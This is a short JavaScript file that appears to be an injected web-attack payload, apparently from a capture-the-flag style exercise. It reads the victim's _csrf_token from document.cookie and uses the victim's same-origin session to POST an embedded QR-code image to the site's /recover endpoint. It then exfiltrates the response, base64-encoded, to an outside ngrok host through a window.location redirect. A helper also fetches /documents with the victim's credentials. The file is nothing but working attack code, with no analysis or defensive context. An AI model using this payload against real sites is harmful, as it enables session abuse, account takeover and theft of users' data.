function dataURItoBlob(dataURI) {
    var byteString;
    if (dataURI.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(dataURI.split(',')[1]);
    else
        byteString = unescape(dataURI.split(',')[1]);
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    var ia = new Uint8Array(byteString.length);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ia], {type:mimeString});
}

function send_response(resp){
    window.location = "https://e8023e55.ngrok.io/record-data?name=documents&data="+btoa(encodeURI(resp));
}

function get_documents(resp){
    console.log(resp);
    fetch("/documents", {method: 'GET', credentials: 'same-origin'}).then(response => response.text()).then((response) => {console.log(response)});
};
qr = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAtoAAALaAQAAAAAnlcmeAAAICElEQVR4nO2dW6rjRhCG/4oM51GGWcAsRd5BljRkSdmBtJSzgIH2Y0Ci8tBdl9YZSIh7ZuzJXw8H25I+DoKi7tWi+G6y/fb92ADhhBNOOOGEE0444YQTTjjhrwuXJhdgux4C4BC746iXgLuI3ACIXA/B1t0sNxztFpF23+u/FsIJ/+lwqKoqFlVVLZOa7MBSAF3tFl3nHbpiUiwFiCcAtMewFP+kqrq+7mshnPAngZuGFgBL1bf8W9PBOfR3h66zpgxw/bqUSQ0wUUMJJ3yQXM4/LOtxAe7X9JMCgAATsN0mleVdoNtt2gEAspTjorgforj3rNd9LYQT/sxwuQHQP66Tyg2HYLseolpauKnrvANLOaRGpAAg8llVbv8GPkoIJ/z/ADcbOivgJlBxn3ZZylXiRln+nHbg/mkXYFJsv+8Xxf1NZRNAt9tlV9ybwf0R/znhhP+P4JuIiFwB4P7mxrBFlfLl/a0qXr2wFEC+vNt9S5lUvhRAbpH4/WH/OeGE/9LwakNPrX+6fd5hFtE+bdfJfqu29hDU+7DDKD3odV8L4YQ/CTzncr1soiuA9tu825+QeUekdhul+BNBed3XQjjhTwKHhqyz65v2tc9U5wyFnbTpatXpSXWdjcJqC+GEj5GqeUja2DS0VkFXwPQNSFpblVhLUFqPQ6gzNZRwwh+XzoZ6m9DczGK9p3UX+YVoUdDdmhrgppc2lHDCx0nTzjJ98FTDhXUHt5lK+9RdCEtMG0o44cMkZ4rm7Nu2XFDx5lwzrlUlV1imaDF/17SbfbmEEz5McqLHlc6d2RZppq+Tx6aWTEI1vRaWukmlhhJO+ONiXi7QGuQj5WOxaddDH53zEZZ2KeAU177uayGc8CeBWwRpyZ8YN7MMrvm2iOmzcGsBm0PTlh8KKDWUcMIfl8jxZH/XfNZqOfs5tFoUreo8tzjUvkaSlxpKOOEjJOmlhm55LncFEC0KEYeG+4sch/onaijhhA8Rs6HAqWEozKd9Bazhz5/2sLQ6uPPeeciv+1oIJ/xJ4GnFSXztFqDsrrrND44ANYWlK8A4lHDCx0uo5EnVUuCZbaipc2v96xRW/THaUMIJHyOmV2ZD1/BUCwD0NVIfYUmLxQC4+ey76V/3tRBO+JPAO7fWQ9DaHGT6Vu9bfUNYtrqqsVjMtJt9uYQTPkq6TWL3NwXunwDcLzuAQ3S7vSmA4yKLHqLb9esFmL9edLtOO7a2pQhab3l/UwF8kPt1XwvhhD8J/Bvd7zFkdsrlZhtqHX6aBmGa+WQcSjjh46SFjEBakWAtCu75WszZyqO9I5yGWcB6KOGEjxWznFOfoz0NmXkVdN5TvFoBUanxOJQaSjjhgyT5tj5BlpzexTK9bbZFvX835XytMhpaSw0lnPAxkoqYPtuS8rt+Mou15EZpZspfWzJYNTobqKGEE/64NBtqnio8yETqpj9d7XcC5ifA+VDCCR8qkePpemv7+bLiCaHiphLAyYZWwGImlBpKOOGPS5fLjS5b350QPUVdBSbty13czPaHp1FDCSf8cYlsTzOBBYjkj/rm3DSglsa9k8F1gBtSaijhhD8sFml2R4K60cyfil2OvtxYxJlDVdpQwgkfJhY0+hKTuXXJn6PP2PoX2lhd4phcK7CVC9RQwgkfIi2X635snAUBwFTNQ9BwcLW70HxlG1+jDSWc8EFicShg82U2UIbZWxk8teuNRXnnvLbH0rYF2lDCCR8jOVMU+aECCzeBlK09aWPMh6ZmhRW0oYQTPkySf5oHtb3FqPT7w/riS16fm+NQaijhhA+SyOXG1qFT64G5tcCHgyPUuwPdzK4AM0WEEz5KIpd76o2PbZzWndDui43Wtuo6wteuf5caSjjhD0sKLWsuyAooeaO15jJM7MvNPvDstpZeLuGEj5PQ0K593mNOt6bpKLS5Pz9UIw7t1jBQQwkn/GGJSDNVN1cf1F68/bYZyK7smZJEqqmgSg0lnPBBkjQ0QtDUetBnddPCv6S6qrlQyp4iwgkfJx+ytYBrmfX/Re9CDI6mEdIC5COX6OUSTvg4STnatEXBG4uWc5I3+uoNEOuN/ChDaijhhA8Ss6FdQref0Y6ewFxKmVVPJjWd2k0vl3DCx0iyjX4aaD4nyVJI3XJO/dAv75WayChRQwkn/HFpHmkBkFf12WR2nMziFz6e2xL10EghUUMJJ3yENC8XU2rO7fzdvOcknVgYT/hZv5wPJZzw4WKeal6AEmVPE19RFEGr7tlDrkYT4Hwo4YQPleTlNjU9ndHie+iL9/qpl2ZCV0tOOtGGEk74IAkNPbUE2bio9+oClj3y5G3sLvrG0b/UUMIJf1xyPrZ3YfvdJ+bH2vkuVVJ3IOyP0oYSTvgwCc2zllz/ql3DbsgSuuotCvkW5nIJJ3yYaC/R+pdGQ33zZt6iUOKMtEgGc08R4YSPlebbVjnNsfQTLcWdXgDWq2v10Djc16HUUMIJf1wsDlXNQ6I2wR0bcT/Oh9pV/WhDqaGEEz5Ikm8bJnBFd/y2p3uRTuhW1TQfyjiUcMJ/CHxRr2mWSVXf3xS4i2D7rMnBFRER+VIOwaKqcqvP7tB1/kt+yn9OOOG/IPybNrRKrFdYzIbmEyA8Bexx6On8btpQwgl/XE5xaG5R8C0oaZm1te7GfHcKS/t2QGoo4YQ/Lqdcrq0Ty2e0RNdurptG4hfItRjGoYQTPk5E//me/yrb674WwgknnHDCCSeccMIJJ5xwwr+T/A2dlAR7ctoaWgAAAABJRU5ErkJggg==";
var d=new FormData();
d.append("qrcode", dataURItoBlob(qr), "qr.png"); 
d.append("_csrf_token", document.cookie.split("_csrf_token=")[1]);
fetch('/recover', {method: 'POST', body: d, credentials: 'same-origin'}).then(response => response.text()).then((response) => {send_response(response)});
